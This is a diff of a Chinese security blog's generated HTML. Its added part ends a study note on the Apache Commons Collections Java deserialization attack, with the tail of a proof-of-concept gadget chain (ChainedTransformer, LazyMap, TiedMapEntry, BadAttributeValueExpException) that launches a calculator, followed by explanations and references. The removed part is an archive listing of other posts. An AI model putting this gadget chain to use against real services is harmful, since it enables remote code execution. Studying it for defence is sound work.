class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app/"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// val是私有变量，所以利用下面方法进行赋值</span></span><br><span class="line">        Field valfield = poc.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(poc);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后成功弹出计算器：</p>
+<p><img src="/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/18.png" alt=""></p>
+<p>针对几个重要的类我这里再借用其他师傅的一些说明：</p>
+<ul>
+<li><p>invokeTransformer</p>
+<p>通过反射返回一个对象。</p>
+</li>
+<li><p>ChainedTransformer</p>
+<p>构造一条Transformer链，将指定的transformers连接在一起。</p>
+</li>
+<li><p>ConstantTransformer</p>
+<p>把一个对象转换为一个常量并返回。</p>
+</li>
+</ul>
+<p>首次接触java的反序列化，确实感受到其和php反序列化的不同之处，但也有其异曲同工之妙。初一上手还挺难理解不过在参考了诸多师傅的分析以后加上自己的调试渐渐摸到一些门路。有一点比较坑，就是IDEA会提前帮我们计算参数值，就导致可能还没有执行到具体命令执行的代码就产生代码执行，这里需要多理解一下。</p>
+<p>参考链接：</p>
+<p><img src="https://p0sec.net/index.php/archives/121/" alt="https://p0sec.net/index.php/archives/121/"></p>
+<p><img src="https://xz.aliyun.com/t/2028#toc-2" alt="https://xz.aliyun.com/t/2028#toc-2"></p>
+<p><img src="https://badcode.cc/2018/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommons-Collections/" alt="https://badcode.cc/2018/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommons-Collections/"></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/31/Bye-2018/" class="archive-article-date">
-  	<time datetime="2018-12-31T02:26:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-31</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/31/Bye-2018/">Bye 2018</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/28/laravel路由解析分析/" class="archive-article-date">
-  	<time datetime="2018-12-28T08:34:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-28</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/28/laravel路由解析分析/">laravel路由解析分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -333,166 +303,103 @@
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/20/Apache-Commons-Collections-Deserialize-Attack/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/09/11/js原型链污染/" class="archive-article-date">
-  	<time datetime="2018-09-11T12:13:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-11</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/02/21/laravelv5-7反序列化rce/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">laravelv5.7反序列化rce(CVE-2019-9081)</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/09/11/js原型链污染/">js原型链污染</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/学习笔记//" class="article-tag-list-link color5">学习笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
+        
+        
+    </div>
+</aside>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/22/Discuz-x-portal-Stored-XSS-CVE-2018-10298/" class="archive-article-date">
-  	<time datetime="2018-04-22T15:34:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-22</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/22/Discuz-x-portal-Stored-XSS-CVE-2018-10298/">Discuz_x_portal_Stored_XSS(CVE-2018-10298)</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/04/Summary-of-PHP-code-audit-experience/" class="archive-article-date">
-  	<time datetime="2018-04-04T15:23:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/04/Summary-of-PHP-code-audit-experience/">Summary of PHP code audit experience</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/30/CVE-2018-9134-Dedecms-background-file-rename/" class="archive-article-date">
-  	<time datetime="2018-03-30T15:18:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/30/CVE-2018-9134-Dedecms-background-file-rename/">CVE-2018-9134-Dedecms-background-file-rename</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/07/CVE-2018-7700-dedecms后台任意代码执行/" class="archive-article-date">
-  	<time datetime="2018-03-07T13:24:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/07/CVE-2018-7700-dedecms后台任意代码执行/">CVE-2018-7700 dedecms后台任意代码执行</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
   
 
 
@@ -516,8 +423,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
